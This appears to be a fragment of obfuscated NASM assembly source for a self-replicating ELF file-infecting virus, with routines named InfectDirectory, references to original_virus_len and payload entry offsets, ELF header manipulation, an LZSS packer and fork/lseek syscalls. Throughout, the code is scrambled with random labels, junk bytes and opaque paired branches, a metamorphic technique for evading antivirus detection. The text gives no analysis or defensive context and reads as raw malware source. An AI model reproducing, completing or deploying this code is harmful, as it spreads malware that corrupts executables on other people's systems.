..@rNMY4e9HxhRk:
    xchg        rbx, rbx
    jmp         $+3
db 0x7f
    jmp         $+3
db 0xe8
    jb          ..@T268t6J3bDKC
    jae         ..@T268t6J3bDKC
..@JwQr24BT8R0I:
    mov         rsi, rsi
    jb          ..@K26B2GsbQIxX
    jae         ..@K26B2GsbQIxX
..@p0l1UCAHRAjK:
    mov         rdi, rdi
    jmp         $+5
db 0x79, 0xd3, 0xbe
    jmp         $+5
db 0xa8, 0x80, 0x46
    js          ..@1uEoMJElRorF
    jns         ..@1uEoMJElRorF
..@MCcmxj5ldlIA:
%ifdef X86_32
    xor         eax, eax
%endif
    jl          ..@qLTWkRAvXvuW
    jge         ..@qLTWkRAvXvuW
..@kf6rrillcsIZ:
    mov         bl, BYTE [rsp+_LZSSE_OFF.character]
    jmp         $+4
db 0x9e, 0x99
    jmp         $+3
db 0xa5
    je          ..@sj90jRnRXfxN
    jne         ..@sj90jRnRXfxN
..@cuYm34Pm4wYy:
    mov         rsp, rsp
    jmp         ..@Z9QFmJBvOCg7
..@z3Ihp4vA3o3y:
    add         WORD [rsp+_LZSSE_OFF.w_index], ax
    jmp         $+3
db 0x1d
    jmp         $+3
db 0x62
    jmp         ..@YEpqwQNVfXmm
..@0radqNqaOIv1:
%ifdef X86_32
    mov         rdx, rdx
%endif
    jmp         ..@spOlKO3x2NsU
..@Fc3EFx361vbW:
    push        rax
    jmp         $+4
db 0x8b, 0xaf
    jmp         $+5
db 0xea, 0x59, 0x18
    jmp         ..@Kq2ZSjkLmEQp
..@RXHAWeqBFZ9h:
    je          ..@jO5fGnCutNi9
    js          ..@tJu15J9cBbft
    jns         ..@tJu15J9cBbft
..@gCZsUmWqhn1o:
    jle         ..@0qpXyCftRIbn
    jmp         ..@8vqQ1GKl5PjW
..@CoQtxG4LwRlk:
    mov         rdx, rdx
    jmp         $+3
db 0x9c
    jb          ..@fxoUTBul7mPf
    jae         ..@fxoUTBul7mPf
..@myclczyxILQN:
    mov         r1, [rsp+_INFFILE_OFF.file+file.fileptr]
    jmp         $+4
db 0x13, 0x37
    jmp         $+4
db 0x9b, 0x21
    js          ..@4y45455XDfs2
    jns         ..@4y45455XDfs2
..@E5Pr5N9OgqbH:
    pop         rsi
    jmp         $+5
db 0x01, 0x95, 0x06
    jl          ..@1qyRLZy3828U
    jge         ..@1qyRLZy3828U
..@QgwUEmYmYc4s:
    mov         r2, m5
    jb          ..@N4wkCdXyrdva
    jae         ..@N4wkCdXyrdva
..@UxnzIL6yM3YO:
    CFILE       DWORD [r5+file.filefd]
    jmp         ..@c3B9pYrorR1k
..@Gy1gtHECo4lz:
    push        rbx
    jmp         $+5
db 0x6b, 0xed, 0x67
    je          ..@6X7RbimlsyWv
    jne         ..@6X7RbimlsyWv
..@tJOHkV8G4quE:
    cmp         BYTE [rsp+_LZSSE_OFF.mask], 10000000b
    jmp         $+5
db 0x0e, 0x77, 0x90
    jmp         ..@fTmG8Gp2ZEHH
..@ElblODsfG4MR:
    lea         r1, [rsp+_INFDIR_OFF.buffer]
    je          ..@GEKP7mSQGIGY
    jne         ..@GEKP7mSQGIGY
..@uZywK0jcOQgi:
    xchg        rsi, rsi
    js          ..@tIyb22wzmakk
    jns         ..@tIyb22wzmakk
..@fguSZHCUuTXt:
    rep         nop
    jmp         $+5
db 0xa1, 0x59, 0x7e
    jb          ..@v3mveS4J6yjf
    jae         ..@v3mveS4J6yjf
..@VpgcH2VgSGcy:
    mov         QWORD [r5+file.filesize], 0x00
    jmp         $+3
db 0x5a
    jmp         $+4
db 0xc9, 0xb2
    jb          ..@2N5Bv7TPrYD6
    jae         ..@2N5Bv7TPrYD6
..@L9HAhz8CcVg2:
    add         r2, 1
    jmp         $+5
db 0xfa, 0xe9, 0xd8
    jmp         $+3
db 0xeb
    jb          ..@Z7paKUeNAECx
    jae         ..@Z7paKUeNAECx
..@yfCzNMRFFzTB:
    mov         rax, rax
    jmp         $+5
db 0x8f, 0x42, 0xf4
    je          ..@qpWOX1DBeRy9
    jne         ..@qpWOX1DBeRy9
..@OIuA04oyYfPU:
    mov         rbx, rbx
    jmp         $+5
db 0x18, 0xc3, 0xb6
    je          ..@IrzKOsAsa5I1
    jne         ..@IrzKOsAsa5I1
..@19QqmDlSqwKy:
    xchg        rdi, rdi
    jmp         $+3
db 0xe3
    jb          ..@y55NyKdr7nja
    jae         ..@y55NyKdr7nja
..@biPwdmwFMFIk:
    xor         r3, r3
    jmp         $+4
db 0x76, 0x80
    js          ..@Ulg4LGDuHNzp
    jns         ..@Ulg4LGDuHNzp
..@bR5Lqxu3xid3:
    push        rbx
    jmp         ..@lAjLEEn3mkAg
..@puToC7Uupj12:
    mov         QWORD [r2+p_h.p_offset], r3
    jmp         ..@U4uxWZSaXgOU
..@iffjcDN5EpUd:
    cmp         r1, 0x00
    js          ..@Hwbwsw8sHOuh
    jns         ..@Hwbwsw8sHOuh
..@HcbwzB052Gw1:
    push        rsi
    jmp         $+4
db 0x18, 0xda
    jb          ..@veINSrQhT0bQ
    jae         ..@veINSrQhT0bQ
..@dNBm0VYTekug:
    push        rdx
    jb          ..@hpaDa8q2bsRD
    jae         ..@hpaDa8q2bsRD
..@Wp7ZDtn5Pztb:
%ifdef X86_64
    mov         r8, 0xffffffffffffffff
%endif
    jmp         ..@Uf1fQv4N3GAo
..@b8Wyqe4kSU0v:
    xchg        rax, rax
    jb          ..@aS5uDmBV6U5j
    jae         ..@aS5uDmBV6U5j
..@nKw2EH6yenOj:
    xchg        rsi, rsi
    jmp         $+5
db 0x9d, 0xd1, 0xb4
    jmp         $+4
db 0xcf, 0x6c
    js          ..@VrZED58zN41c
    jns         ..@VrZED58zN41c
..@UY8abEIIInII:
    add         r1, e_h.e_shentsize
    je          ..@4QGfRIVcThF7
    jne         ..@4QGfRIVcThF7
..@79ioEaNLX4ll:
    jnz         ..@p1yWmLLBwLYl
    jmp         $+5
db 0x14, 0xb8, 0x96
    jl          ..@tLFUFL7zMi83
    jge         ..@tLFUFL7zMi83
..@LBWGAcYk14gM:
    ret
    js          ..@b57s9zdrznFN
    jns         ..@b57s9zdrznFN
..@TZCOFjICv9Fv:
    add         r1, non_packed_len+PADDING
    jmp         ..@MDDyXzocps48
..@7QhXQTkQXJh6:
    mov         al, BYTE [rsp+_LZSSE_OFF.mask]
    js          ..@pWVVyDchoFfO
    jns         ..@pWVVyDchoFfO
..@EpYR12khU4By:
    mov         r1, QWORD [r5+file.fileptr]
    jb          ..@T4zjNn7bag1b
    jae         ..@T4zjNn7bag1b
..@ZnApgMs823Ab:
    pop         rdi
    js          ..@r9AZ6jHW60AW
    jns         ..@r9AZ6jHW60AW
..@17OGrr8UvBiY:
    CFILE       DWORD [rsp+_PROC_OFF.filefd]
    jb          ..@IZsY6fD5mZJc
    jae         ..@IZsY6fD5mZJc
..@VrhKie5nxP2m:
    pop         rcx
    jmp         $+3
db 0xde
    jl          ..@YMto3PCIPcn6
    jge         ..@YMto3PCIPcn6
..@tXPLME6pwgXu:
    mov         rax, rax
    jmp         ..@zCs21D0IeKmr
..@wlg8YuJZw8HQ:
    mov         rax, rax
    jmp         $+4
db 0x50, 0xe4
    jmp         $+5
db 0xde, 0x0a, 0x57
    jb          ..@ORntJQay9ZcZ
    jae         ..@ORntJQay9ZcZ
..@24LgffKTHnML:
    mov         rsi, rsi
    jmp         ..@YDkvT2QMhpTT
..@ueyBKJUkvY0r:
    mov         rdi, rdi
    jmp         $+5
db 0x1a, 0xc1, 0x56
    js          ..@YHXfWFuC36to
    jns         ..@YHXfWFuC36to
..@vw2gTie34ils:
    mov         BYTE [rsp+_LZSSE_OFF.bits], 0x00
    jmp         ..@mBaueE3rZPif
..@etGfzOchGiyS:
    rep         nop
    jmp         $+3
db 0xc5
    jmp         ..@7qV2Q4glsN0Y
..@ynLy9FOznQs8:
    push        rax
    jl          ..@ecn5eX34EGb0
    jge         ..@ecn5eX34EGb0
..@gixd21FU7PYj:
    shr         BYTE [rsp+_LZSSE_OFF.mask], 1
    js          ..@ZF1IErr9XlhH
    jns         ..@ZF1IErr9XlhH
..@BSWaUeZ3Y0gd:
    pop         rax
    jmp         $+5
db 0x92, 0x54, 0xe8
    jl          ..@Odnlk1yi0WMx
    jge         ..@Odnlk1yi0WMx
..@am3KMn24P8gn:
    xchg        rdi, rdi
    jmp         ..@mG7zlKUGJc9g
..@ZmDEwi4JyyRw:
    xchg        rcx, rcx
    jl          ..@1GuXtI0C9zUX
    jge         ..@1GuXtI0C9zUX
..@yzaezV3bLDlf:
    push        rax
    jmp         ..@BSWaUeZ3Y0gd
..@roYuaKMCPAHj:
    xchg        rsp, rsp
    jmp         $+3
db 0x06
    jl          ..@rN75i6nmU55b
    jge         ..@rN75i6nmU55b
..@2Ykzv5mNjePZ:
    mov         eax, SYS_LSEEK
    je          ..@ncMgxm67rxUv
    jne         ..@ncMgxm67rxUv
..@8RDNvl112JoV:
    jle         ..@84SW3nfxsO3K
    jmp         $+5
db 0x9b, 0x28, 0x61
    jmp         $+3
db 0x38
    jmp         $+4
db 0xa4, 0x1b
    jl          ..@XLaMBiOxC1FA
    jge         ..@XLaMBiOxC1FA
..@hypNktNaX0Ko:
    mov         al, BYTE [rsp+_LZSSE_OFF.mask]
    js          ..@kPSL7B3urxZl
    jns         ..@kPSL7B3urxZl
..@XLaMBiOxC1FA:
    xchg        rsi, rsi
    jl          ..@kHylpdEx2SIx
    jge         ..@kHylpdEx2SIx
..@f3FMXw21kz0E:
    pop         rax
    jmp         $+5
db 0x34, 0x72, 0xe2
    jmp         $+4
db 0xb6, 0x87
    jmp         $+4
db 0x16, 0xed
    jl          ..@MIq2KKXyBECM
    jge         ..@MIq2KKXyBECM
..@uUOWKu2pyskk:
    xchg        rcx, rcx
    je          ..@VpEdjeumYXoa
    jne         ..@VpEdjeumYXoa
..@fTmG8Gp2ZEHH:
    je          ..@CF88S0DvdHvV
    jmp         $+3
db 0x42
    jmp         ..@hPWjEQvvsRGT
..@WMXUWQwops3G:
    push        rax
    jmp         $+5
db 0xe1, 0x94, 0x18
    je          ..@OgrfBCadxDA9
    jne         ..@OgrfBCadxDA9
..@xPpQ73VC4N4C:
    add         r1, 2
    jb          ..@7ZmQAwG2PO7b
    jae         ..@7ZmQAwG2PO7b
..@CrWMDKvU0NZi:
%ifdef X86_64
    mov         rcx, rcx
%endif
    jmp         ..@5jMyfTBOcbh3
..@iwlwlGY0A7v2:
    mov         rax, SYS_FORK
    js          ..@41tJPnybCWQN
    jns         ..@41tJPnybCWQN
..@tloWc9SBuKe7:
    push        r4
    jmp         $+4
db 0xbe, 0x5e
    jmp         $+3
db 0x37
    jmp         ..@S417i2MsAQSo
..@6gJ7yYflvN33:
    pop         rcx
    jmp         ..@sNVtVrEGhXDf
..@XUINNHKKccsS:
    mov         rdi, m6
    jmp         $+5
db 0x64, 0x5b, 0x4a
    jmp         ..@F7my4gxzyh30
..@PADNJA1D5KvB:
    pop         rdi
    jmp         $+4
db 0x3d, 0x34
    jl          ..@1HWpW15ZxcZg
    jge         ..@1HWpW15ZxcZg
..@wf7IW6Qivu49:
%ifdef X86_64
    xor         r9, r9
%endif
    jmp         ..@ExdEKAxPrJMX
..@Yj1MD5Wswl1j:
    xor         rdx, rdx
    js          ..@kgb4HcspMr9X
    jns         ..@kgb4HcspMr9X
..@ihaQDXWAycb6:
    mov         QWORD [rsp+_VADDR_OFF.tmp_offset], 0
    jl          ..@3ooOqnvgFVUT
    jge         ..@3ooOqnvgFVUT
..@y55NyKdr7nja:
    xchg        rsp, rsp
    jmp         ..@99zQbxQa7rQr
..@fvrprKjLN6DI:
    mov         edx, LOOKAHEAD_LENGTH
    jmp         $+5
db 0xde, 0x47, 0x68
    jmp         ..@EPnolf7zOpew
..@jqDAYTnrR5mL:
    sub         QWORD [rsp+_LZSSE_OFF.length], rcx
    jmp         $+4
db 0x35, 0x2b
    jmp         $+4
db 0x7d, 0x4b
    jmp         $+5
db 0xd6, 0xf0, 0xcc
    jl          ..@L1Ir4OjJs2f8
    jge         ..@L1Ir4OjJs2f8
..@YG29MfGbkwMB:
    pop         rdi
    jmp         $+3
db 0x9f
    jmp         $+4
db 0xda, 0xb0
    jl          ..@Db68AV2YBKBO
    jge         ..@Db68AV2YBKBO
..@pxcqRtizkz19:
    push        rcx
    jmp         $+5
db 0x31, 0xbe, 0x4c
    jmp         ..@pofs4SfGnmzz
..@LZsZA2n8N6bN:
    mov         rdi, r1
    jmp         $+5
db 0xb7, 0x6f, 0xd3
    js          ..@ACEn5FS44ETb
    jns         ..@ACEn5FS44ETb
..@WrhaMFvQBApH:
    sub         rcx, m6
    jmp         ..@uO7tZyrAkFOm
..@vu9XzzRbA1In:
    mov         rsi, rsi
    jmp         $+5
db 0xd1, 0x7e, 0xf8
    jmp         ..@k6sWs4Dn9pqI
..@OfnmrpqErvxQ:
    pop         rbx
    je          ..@bhLr2KZueNPK
    jne         ..@bhLr2KZueNPK
..@nbGIlZo7pKuA:
    xchg        rcx, rcx
    js          ..@hXsAigAO3lvS
    jns         ..@hXsAigAO3lvS
..@22GMKvmDgahJ:
    pop         rdi
    jl          ..@j9UdT6kvBl0r
    jge         ..@j9UdT6kvBl0r
..@G7fXkRYBDQzP:
    mov         eax, 0x0
    jmp         $+4
db 0x1d, 0x0d
    jmp         $+4
db 0x7c, 0x2a
    js          ..@8vDFdElTfpad
    jns         ..@8vDFdElTfpad
..@sBael5cpc75U:
    xor         rdi, rdi
    js          ..@kiVJfGCJzusg
    jns         ..@kiVJfGCJzusg
..@AQGg0iTPPxl7:
    xchg        rcx, rcx
    jmp         ..@v0dWy6cu6c5J
..@r6b08IOKe2dg:
    mul         r3
    jl          ..@45UUEHzu2TEu
    jge         ..@45UUEHzu2TEu
..@rngHXVWcU6vx:
    push        rdx
    jmp         $+4
db 0x84, 0x6b
    jb          ..@WtMFapMIgb1d
    jae         ..@WtMFapMIgb1d
..@GwA8NfzbtNrr:
    mov         rdi, QWORD [rsp+_LZSSE_OFF.outputaddr]
    jmp         ..@aNPSC5h78T1k
..@zCHA0whR9cz9:
%ifdef X86_32
    int         0x80
%endif
    jmp         $+3
db 0x4c
    jb          ..@ixUrK4LjV2uI
    jae         ..@ixUrK4LjV2uI
..@dQkKCKuKlKzY:
    shl         ebx, LENGTH_BITS
    js          ..@Cjv8LpNlK1uV
    jns         ..@Cjv8LpNlK1uV
..@G8mKV969HHTx:
    pop         rdi
    jl          ..@1TaIW1fl6e9v
    jge         ..@1TaIW1fl6e9v
..@fVIoxyvwGP06:
    mov         rdi, rdi
    je          ..@Tdoqoo9HP8Hz
    jne         ..@Tdoqoo9HP8Hz
..@ItEdko2qNPqC:
    mov         r3, QWORD [r5+file.filesize]
    jb          ..@eRkCP9SXHVra
    jae         ..@eRkCP9SXHVra
..@7RkQz7e6YQDL:
    pop         rbx
    jmp         $+5
db 0xf1, 0x78, 0x40
    jb          ..@Fzxr4ha0Xs76
    jae         ..@Fzxr4ha0Xs76
..@BEga2hXajbqb:
    mov         rdx, rdx
    jb          ..@HzKVx752Rc0D
    jae         ..@HzKVx752Rc0D
..@V1RUplOIqQhc:
    push        rdx
    jmp         $+4
db 0xd8, 0x36
    je          ..@ibox1VPTvxjF
    jne         ..@ibox1VPTvxjF
..@FpnH3Kz1R9iK:
    xchg        rdx, rdx
    jmp         $+4
db 0x7a, 0xdc
    js          ..@w9nwSKEz6ICK
    jns         ..@w9nwSKEz6ICK
..@Be8KGdbtd1bz:
    xchg        rsi, rsi
    js          ..@WSQX4FjeLvZq
    jns         ..@WSQX4FjeLvZq
..@DxBnvS7E3dT0:
    push        rbx
    jl          ..@7D1cpw33tDqm
    jge         ..@7D1cpw33tDqm
..@uzvGiLsrx8hy:
    pop         rdx
    jl          Strcpy
    jge         Strcpy
..@b87XEMVrR2w7:
    pop         rdx
    jmp         $+5
db 0x17, 0x0e, 0x92
    jmp         ..@qxXlWQTDwRj0
..@6oDd2b0HHz0F:
    mov         r1, r4
    jmp         ..@laYdO7PLLHxt
..@r2IRAvzAFDTL:
    test        rax, rax
    jmp         ..@gUJUTc4Pxjgh
..@P2GRm5EPAAWG:
    mov         rax, rax
    jmp         ..@5qMp7U1aVYhx
..@fnPt19C2r7W5:
%ifdef X86_32
    mov         edi, 0xffffffff
%endif
    je          ..@fD9WjIIwLG6V
    jne         ..@fD9WjIIwLG6V
..@FsueejrGQZqA:
    pop         rsi
    jmp         $+5
db 0xfb, 0xfa, 0xa5
    jb          ..@3qhWbGSZwfup
    jae         ..@3qhWbGSZwfup
..@4MUZWbGEmQ9C:
    xor         rax, rax
    je          ..@xqBhJHaLb2u7
    jne         ..@xqBhJHaLb2u7
..@iCJT9WcLb1Df:
    mov         r2, m6
    jmp         $+5
db 0xb2, 0x0e, 0x18
    jmp         $+4
db 0x48, 0xd4
    jmp         ..@NM31AcGBSEdo
..@Z9QFmJBvOCg7:
    add         WORD [rsp+_LZSSE_OFF.buffersize], cx
    js          ..@m1PdXKoAEKuF
    jns         ..@m1PdXKoAEKuF
..@XIpWo3VFd9Xj:
    mov         r5, [rsp]
    jmp         $+5
db 0x8d, 0x6f, 0xb5
    jmp         $+4
db 0x7d, 0x1e
    jl          ..@5DADqi2SHIZb
    jge         ..@5DADqi2SHIZb
..@c1twnLtMCMqZ:
%ifdef X86_64
    xor         rax, rax
%endif
    jmp         ..@IiU5kjAgty7E
..@FCkAF0sLln4d:
    mov         QWORD [r5+file.fileptr], rax
    jmp         ..@DUas4jJMsDwK
..@qjGEDsmTc8Ss:
    pop         rsi
    jmp         $+4
db 0x53, 0x80
    jmp         $+5
db 0x10, 0x98, 0x15
    jmp         ..@mmzWrm8nET0h
..@CnaE2HuIPgbv:
    mov         r5, [rsp]
    jmp         $+4
db 0xd9, 0x34
    jb          ..@nh45wV0xyYFU
    jae         ..@nh45wV0xyYFU
..@cWTBZLIBWcZ4:
    xchg        rax, rax
    jb          ..@38Taf5u3fbR2
    jae         ..@38Taf5u3fbR2
..@qGa0FBoXxwla:
    xor         rdx, rdx
    je          ..@vgubbpfAayZl
    jne         ..@vgubbpfAayZl
..@EiJAQr7PjSIk:
    mov         QWORD [rdi], rsi
    jmp         $+3
db 0xda
    jmp         $+4
db 0x68, 0xcf
    jmp         $+3
db 0xe6
    jb          ..@LlBEQaraNGPD
    jae         ..@LlBEQaraNGPD
..@vmCsVMRQJSy2:
    mov         r5, [rsp+_NBF_OFF.file]
    jmp         ..@19QqmDlSqwKy
..@L3v1qtTv5pQP:
    mov         [rsp+_LZSSE_OFF.inputaddr], rsi
    jmp         $+3
db 0x3c
    jmp         $+4
db 0xb2, 0x29
    jmp         ..@ozVpxELDkzia
..@KpkTYLotlJtb:
    mov         BYTE [rsp+_LZSSE_OFF.character], al
    jl          ..@q4wE4gsxTfzo
    jge         ..@q4wE4gsxTfzo
..@Slx826222n4p:
    jmp         ..@jO5fGnCutNi9
    jmp         $+4
db 0x75, 0xeb
    jmp         ..@IPj5KVcHhk6N
..@rTA7EQQGoeuD:
    mov         WORD [rsp+_DYNPIE_OFF.shentsize], ax
    jmp         $+4
db 0x67, 0xff
    je          ..@xPpQ73VC4N4C
    jne         ..@xPpQ73VC4N4C
..@TZuzkiNXJsA0:
%ifdef X86_64
    mov         rbx, rbx
%endif
    jmp         $+4
db 0x0c, 0xd7
    jl          ..@rZNMBn0qy6XL
    jge         ..@rZNMBn0qy6XL
..@BtyRjbjftHgI:
    cmp         rcx, QWORD [rdi+s_h.sh_size]
    jl          ..@NwTFznuAfqbO
    jge         ..@NwTFznuAfqbO
..@dh0zqcCNCSIZ:
    pop         rcx
    jmp         $+5
db 0x6f, 0x99, 0x81
    jl          ..@q0x9hyCuXScD
    jge         ..@q0x9hyCuXScD
..@wepHYEBt9c86:
    xchg        rcx, rcx
    jmp         $+5
db 0x92, 0xf4, 0x51
    jb          ..@Q0G5qqTH8Uag
    jae         ..@Q0G5qqTH8Uag
..@UW7NGinq3rmK:
    xchg        rdi, rdi
    jmp         $+5
db 0xbc, 0x69, 0x74
    js          ..@9Ibsn2SbuT7q
    jns         ..@9Ibsn2SbuT7q
..@mmzWrm8nET0h:
    cmp         eax, 0x03
    jmp         ..@8FtcHhY7OnKb
..@EBG6YGeiUZQH:
    CFILE       [rsp+_INFDIR_OFF.dirfd]
    jmp         $+4
db 0x99, 0x21
    jmp         ..@8QCAaefpntvL
..@VpEdjeumYXoa:
    mov         ecx, WINDOW_LENGTH-LOOKAHEAD_LENGTH 
    jmp         $+3
db 0xb9
    jmp         $+5
db 0x40, 0xb4, 0x1f
    jmp         ..@WTLJaZoU3AyN
..@BffhNn4nDdKp:
    jne         ..@TxZjXiXyzd4c
    jmp         ..@NNaZORfplShL
..@e6OarU1PfXa8:
    mov         WORD [rsp+_LZSSE_OFF.buffersize], WINDOW_LENGTH*2
    jmp         ..@RuFAj8tLEGw3
..@OJ2RGYPnin0S:
    rep         movsb
    je          ..@7CLVM1a80yjY
    jne         ..@7CLVM1a80yjY
..@lkfQdAtpd6f6:
    push        rdi
    jmp         $+5
db 0xc0, 0xd2, 0xd8
    jb          ..@F5imSIFxvbPw
    jae         ..@F5imSIFxvbPw
..@7HEd1FMuod7L:
    push        rdi
    jb          ..@drVwpHaf2BUt
    jae         ..@drVwpHaf2BUt
..@KUsqIud2R7Xe:
    mov         BYTE [r1], 0x00
    jmp         $+4
db 0x0b, 0x17
    jmp         ..@ElblODsfG4MR
..@oJp5vgvFy9NO:
%ifdef X86_32
    mov         ecx, original_virus_len+PADDING
%endif
    jmp         ..@P6WCig3HGEmJ
..@bf972IegiuMY:
    VAR         packed, procs
    jmp         $+4
db 0xa8, 0x5a
    je          ..@uZ8Jd9VpzAMB
    jne         ..@uZ8Jd9VpzAMB
..@sHPoOKVZYBqQ:
%ifdef X86_64
    pop         rdi
%endif
    jmp         ..@paXchyRNXcSe
..@zS6P2feU6rXC:
    push        rcx
    je          ..@o9hfY4FXXJuX
    jne         ..@o9hfY4FXXJuX
..@iittYxDETp8t:
    xchg        rsp, rsp
    jl          ..@YlXaryNUdXji
    jge         ..@YlXaryNUdXji
..@WWsA7tojkTnW:
    xchg        rsp, rsp
    jmp         $+5
db 0x38, 0x59, 0xf4
    js          ..@sZ702yhxLzNo
    jns         ..@sZ702yhxLzNo
..@kRhPtLS5dSzG:
    mov         rbx, rbx
    jmp         $+5
db 0x6d, 0xcd, 0x42
    jmp         $+5
db 0x00, 0xf1, 0x10
    jl          ..@WePPqjU8CZlh
    jge         ..@WePPqjU8CZlh
..@Oko6D5qWq2iH:
    pop         rcx
    jmp         $+4
db 0xc0, 0xc8
    js          ..@aZpypC93L3pe
    jns         ..@aZpypC93L3pe
InfectDirectory:
    jmp         ..@rSMepkUisf3K
..@cCxm56iRzE0j:
    shr         dx, 0x4
    jmp         $+4
db 0xb3, 0x82
    jb          ..@ITostA6VL1FO
    jae         ..@ITostA6VL1FO
..@N1TRN5K529Sm:
    push        rdx
    js          ..@1oKWoeKW1kr8
    jns         ..@1oKWoeKW1kr8
..@7CLVM1a80yjY:
    push        rax
    jmp         $+5
db 0x42, 0xf2, 0x7a
    jmp         ..@IVgXqamCtmd7
..@dzyVcE2RGJqQ:
    jnz         ..@b57s9zdrznFN
    jmp         $+3
db 0xde
    jmp         $+5
db 0xc5, 0xd2, 0xc5
    js          ..@EpYR12khU4By
    jns         ..@EpYR12khU4By
..@d3WYlvIExPLp:
    mov         r1d, eax
    jmp         $+4
db 0xde, 0x0a
    js          ..@Tes2pADptLQS
    jns         ..@Tes2pADptLQS
..@jk10u3qGBQeo:
    push        rcx
    js          ..@ZzCQdJKIoxvY
    jns         ..@ZzCQdJKIoxvY
..@YlXaryNUdXji:
    call        Strcpy
    jmp         ..@CnSUqmnXUhQ1
..@qLTWkRAvXvuW:
%ifdef X86_32
    xor         ebx, ebx
%endif
    jmp         ..@8pFOKPohcQRX
..@eCcUSo79cIHA:
    pop         rdi
    jb          ..@l41A9lVSnnHp
    jae         ..@l41A9lVSnnHp
..@YZifAqaJi8xp:
    xchg        rsi, rsi
    jb          ..@50Okg85fbhTZ
    jae         ..@50Okg85fbhTZ
..@eRqSKPcuzXcQ:
%ifdef X86_64
    mov         r10d, 0x01
%endif
    jmp         $+3
db 0xde
    jl          ..@EESyHOhtEEbH
    jge         ..@EESyHOhtEEbH
..@veFse93Iv4EX:
    mov         cl, BYTE [rsp+_LZSSE_OFF.cmp_len]
    jl          ..@Bj4waQ4sKUuB
    jge         ..@Bj4waQ4sKUuB
..@G5STAXR3HiT2:
    pop         rsi
    jmp         $+3
db 0x4e
    je          ..@Ps7vIwtfprxm
    jne         ..@Ps7vIwtfprxm
..@D9DSLc2b4CIO:
    and         r2, 0x00ffffff
    jmp         $+5
db 0x06, 0x11, 0xf4
    jmp         $+4
db 0xfa, 0x9b
    jl          ..@VoGYGeQlZ1ke
    jge         ..@VoGYGeQlZ1ke
..@LEPVklxdqENe:
    je          ..@onJB9s7WCkp0
    jmp         $+5
db 0xfc, 0x1d, 0x4f
    jmp         $+4
db 0xe5, 0x02
    jb          ..@E9v9RnTKxpq1
    jae         ..@E9v9RnTKxpq1
..@Kq2ZSjkLmEQp:
    xchg        rax, rax
    jmp         ..@BpJIwZ999DNP
..@falxSMCF8nQA:
    xchg        rcx, rcx
    jmp         $+5
db 0x22, 0xcb, 0x06
    je          ..@XsS5j59lOIMy
    jne         ..@XsS5j59lOIMy
..@IZsY6fD5mZJc:
    rep         nop
    jmp         $+4
db 0x90, 0x12
    jl          ..@RS6KbmqXq8dy
    jge         ..@RS6KbmqXq8dy
..@fxoUTBul7mPf:
    mov         r4, QWORD [rsp+_INFDIR_OFF.dirindex]
    jmp         $+4
db 0x4a, 0xbb
    js          ..@Hl2sYF7k1Ydz
    jns         ..@Hl2sYF7k1Ydz
..@6FXIjvbLXp3I:
    mov         r3, _signature.startsize
    jb          ..@8XBikfyE0WHu
    jae         ..@8XBikfyE0WHu
..@s2zJbkONoC5b:
    mov         QWORD [rsp+_PAYLOAD_OFF.entry], r1
    jmp         ..@iYu36yPJxVcR
..@Cjv8LpNlK1uV:
    or          bx, ax
    jl          ..@JUEP3gNe55yH
    jge         ..@JUEP3gNe55yH
..@xUMZlFTcE1LG:
    mov         r5, r1
    jmp         ..@njeNmYuXT6vw
..@YMmmJFx84RWZ:
    push        rax
    jmp         $+5
db 0x5b, 0x9d, 0xad
    jb          ..@Tjk58gEDzHyx
    jae         ..@Tjk58gEDzHyx
..@ifDsA4n7RsHF:
    xor         r4, r4
    jmp         $+4
db 0xe4, 0x0d
    jmp         $+4
db 0x96, 0x10
    je          ..@vmCsVMRQJSy2
    jne         ..@vmCsVMRQJSy2
..@THpuejmJQnNM:
    xchg        rbx, rbx
    jmp         ..@aKer3QKVYp0g
..@XO2LEaSRedKg:
    je          ..@kvxyBBVN23xy
    jmp         ..@ncSv5nqPNGKW
..@3ZFnZeSmOYdy:
    jle         ..@4aKGEtYNITlk
    jmp         $+3
db 0x98
    jmp         ..@aZqORkrCzNaO
..@tOip3lqnDL6c:
    mov         rbx, rbx
    jmp         $+4
db 0x8f, 0xf3
    jmp         $+4
db 0x34, 0xa9
    jmp         $+3
db 0x5c
    js          ..@yxX37oUWPFZa
    jns         ..@yxX37oUWPFZa
..@xQqE0xsRentq:
    inc         WORD m5
    jmp         $+4
db 0x44, 0x93
    jmp         $+5
db 0x7b, 0x67, 0xa1
    jmp         $+4
db 0x8b, 0xfb
    js          ..@ZSa72ezPgv8s
    jns         ..@ZSa72ezPgv8s
..@U4uxWZSaXgOU:
    push        r2
    jmp         $+3
db 0xda
    je          ..@EnCgKOm8GDwT
    jne         ..@EnCgKOm8GDwT
..@sj90jRnRXfxN:
    mov         edx, 100000000b
    jmp         ..@i8Apw07geBXV
..@Lr5HFr6R1IGX:
    sub         rsp, _LZSSE_OFF_size
    jmp         $+4
db 0x5f, 0xa0
    jb          ..@lqJw0pCLeHas
    jae         ..@lqJw0pCLeHas
..@kJSpkuPpr6EU:
    mov         rsp, rsp
    jmp         $+3
db 0xbf
    jmp         ..@AsCeybbO5aZa
..@1BdoHp1WvPgX:
    add         rdi, 0x4
    jmp         $+3
db 0xa6
    jmp         ..@qpQp3JKQwAVb
..@qFf0j59B4HRP:
    pop         rbx
    js          ..@rUIe8Arzm2J0
    jns         ..@rUIe8Arzm2J0
..@PumgHYKh6RA9:
    push        rbx
    jmp         ..@W3y5v9uwA7Kn
..@5ROBfaaoLi9s:
    mov         r1, m6
    jmp         $+5
db 0x3c, 0x04, 0x5c
    jmp         $+5
db 0x2b, 0x37, 0x5a
    jl          ..@SB5cWr5BIA6a
    jge         ..@SB5cWr5BIA6a
..@SSYGMmteH3Zx:
    pop         rdi
    jmp         $+5
db 0xd9, 0x8a, 0x70
    jb          ..@V1RUplOIqQhc
    jae         ..@V1RUplOIqQhc
..@2v6VYXlL54Uj:
    pop         rdi
    jb          ..@AEgL837nFr05
    jae         ..@AEgL837nFr05
..@H676Vx7ebDzq:
    pop         rdx
    jmp         $+4
db 0x1c, 0xc1
    jmp         $+5
db 0x06, 0x68, 0x19
    jb          ..@qYjRZIO5jobn
    jae         ..@qYjRZIO5jobn
..@tLFUFL7zMi83:
    mov         rbp, rbp
    js          ..@3psOHsEM0wAE
    jns         ..@3psOHsEM0wAE
..@DLd4k78dCAX7:
    push        rax
    jmp         ..@SFToo3VAyCoA
..@PU1BVHn1UbjH:
    syscall
    jmp         ..@kJSpkuPpr6EU
..@Fzxr4ha0Xs76:
    mov         rdx, rdx
    jb          ..@vFPQT1zaSjyP
    jae         ..@vFPQT1zaSjyP
..@boQG2H8Su9K9:
    pop         rdi
    je          ..@WrhaMFvQBApH
    jne         ..@WrhaMFvQBApH
